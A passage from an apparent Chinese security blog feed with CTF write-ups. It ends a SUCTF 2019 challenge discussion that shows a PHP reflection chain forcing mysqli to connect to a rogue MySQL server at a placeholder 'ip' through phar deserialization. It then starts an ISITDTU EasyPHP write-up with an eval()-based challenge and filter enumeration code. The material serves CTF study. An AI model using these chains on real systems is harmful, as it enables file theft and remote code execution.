nXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150346.png" alt=""></p><p>当然 php://filter 在这里也适用</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820150839.png" alt=""></p><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>而后就是 admin.php 中令人异常疑惑的四段代码了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-keyword">$this</span>-&gt;clazz);</span><br><span class="line"><span class="hljs-keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func1);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func2);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func3);</span><br><span class="line">$reflectionMethod-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg3);</span><br></pre></td></tr></tbody></table></figure><p></p><p>有什么用呢？当然如果出题人xx地用<code>__destruct</code>自然没什么用，如果用<code>__wakeup</code>，自然得想办法去触发反序列化。然而这四段代码其实正好对应了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$m = <span class="hljs-keyword">new</span> mysqli();</span><br><span class="line">$m-&gt;init();</span><br><span class="line">$m-&gt;real_connect(<span class="hljs-string">'ip'</span>,<span class="hljs-string">'select 1'</span>,<span class="hljs-string">'select 1'</span>,<span class="hljs-string">'select 1'</span>,<span class="hljs-number">3306</span>);</span><br><span class="line">$m-&gt;query(<span class="hljs-string">'select 1;'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>其实也就是 @LoRexxar’ 在 Tsec 上进行的分享 <a href="https://paper.seebug.org/998/" target="_blank" rel="noopener">Comprehensive analysis of the mysql client attack chain</a> 的内容了，@zsx 文章中指出</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190820151817.png" alt=""></p><p>既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-string">'Mysqli'</span>);</span><br><span class="line">$sql = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">'Mysqli'</span>, <span class="hljs-string">'init'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, $arr);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">'Mysqli'</span>, <span class="hljs-string">'real_connect'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="hljs-string">'ip'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'123456'</span>,<span class="hljs-string">'test'</span>,<span class="hljs-string">'3306'</span>);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">'Mysqli'</span>, <span class="hljs-string">'query'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="hljs-string">'select 1'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Bonus-PHP-is-the-best"><a href="#Bonus-PHP-is-the-best" class="headerlink" title="Bonus: PHP is the best!"></a>Bonus: PHP is the best!</h3><p><a href="https://bugs.php.net/bug.php?id=77496" target="_blank" rel="noopener">mysqli-&gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting</a></p><h3 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h3><p>总之，这个题目我先分享给大家的点就是这些了，这个题我自己认为自己出的也不是很好，整个构造链没有设计的特别好，参考了比较多的题，比如 2018 N1CTF easy &amp; hard php，2018 LCTF T4lk 1s ch34p,sh0w m3 the sh31l 等等赛题，我觉得这些都是很优质的赛题，我也想向这些赛题去努力，可惜由于自己的知识面以及知识深度的不够，还不能做到那种赛题的程度，尤其是 @K0rz3n 师傅的出题 [blog]([<a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20详细分析/]" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20详细分析/]</a>(<a href="https://www.k0rz3n.com/2018/11/19/LCTF" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)) ，我前前前后后读了很多遍，最后还是没有做到像 @K0rz3n &amp; @wupco 师傅那样的出题深度，难以望其项背。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>最后，如果有小伙伴希望与我一起交流探索 phar 的一些小 trick 或者交流一些其他知识，欢迎来信：zeddyu.lu#gmail.com，如果大家有意愿加入 SU，也欢迎来信到：suers_xctf#126.com</p><p>最后的最后，很感谢大家的不杀之恩，这次 SUCTF 的举办主要依靠的是新一代队员的努力，由于新一代队员在运维、出题方面经验都不是特别老道，所以在比赛过程中产生了些许意外 &amp; 失误，希望大家多多见谅，在这里给体验不好的师傅们谢罪了，哐哐哐，但是我们也会向着更好的方向努力，带给师傅们更好的比赛体验。</p><p>像《头号玩家》里面的一句话一样，感谢大家抽时间来打我们的比赛！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这次我给 SUCTF 出了三道 Web，分别是 CheckIn 、 pythonginx 、 Upload Labs 2，下面聊一下出题时候的一些思路以及随想，还有最近对于 phar 的一些深入挖掘。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/6057&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6057&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
      <category term="php" scheme="https://blog.zeddyu.info/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTU CTF 2019 EasyPHP 回顾</title>
    <link href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/"/>
    <id>https://blog.zeddyu.info/2019/07/20/isitdtu-2019/</id>
    <published>2019-07-20T01:22:26.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677</a></p></blockquote><p>在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行 getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了…</p><a id="more"></a><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>​    Don’t try to run any Linux command, just use all the PHP functions you know to get the flag</p></blockquote><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="hljs-string">'_'</span>];</span><br><span class="line"><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">eval</span>($_);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h1><h2 id="Explation"><a href="#Explation" class="headerlink" title="Explation"></a>Explation</h2><p>题目代码比较简单，首先看看第一个正则：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190711014316.png" alt=""></p><p>再看看第二个过滤，<code>strtolower</code>将字符串转换为小写，用<code>count_chars</code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13</p><h2 id="Doing"><a href="#Doing" class="headerlink" title="Doing"></a>Doing</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>既然正则约束了比较多的条件，自然我们首先得看看还有哪些可用的。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">$arr = get_defined_functions()[<span class="hljs-string">'internal'</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">foreach</span> ($arr <span class="hljs-keyword">as</span> $key =&gt; $value) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span>, $value) ){</span><br><span class="line">        <span class="hljs-keyword">unset</span>($arr[$key]);</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($value), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> ){</span><br><span class="line">        <span class="hljs-keyword">unset</span>($arr[$key]);</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>得到还剩下以下内置函数可用：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">15</span>) {</span><br><span class="line">  [<span class="hljs-number">206</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">5</span>) <span class="hljs-string">"bcmul"</span></span><br><span class="line">  [<span class="hljs-number">1060</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">5</span>) <span class="hljs-string">"rtrim"</span></span><br><span class="line">  [<span class="hljs-number">1066</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"trim"</span></span><br><span class="line">  [<span class="hljs-number">1067</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">5</span>) <span class="hljs-string">"ltrim"</span></span><br><span class="line">  [<span class="hljs-number">1078</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">3</span>) <span class="hljs-string">"chr"</span></span><br><span class="line">  [<span class="hljs-number">1102</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"link"</span></span><br><span class="line">  [<span class="hljs-number">1103</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">6</span>) <span class="hljs-string">"unlink"</span></span><br><span class="line">  [<span class="hljs-number">1146</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">3</span>) <span class="hljs-string">"tan"</span></span><br><span class="line">  [<span class="hljs-number">1149</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"atan"</span></span><br><span class="line">  [<span class="hljs-number">1150</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">5</span>) <span class="hljs-string">"atanh"</span></span><br><span class="line">  [<span class="hljs-number">1154</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">4</span>) <span class="hljs-string">"tanh"</span></span><br><span class="line">  [<span 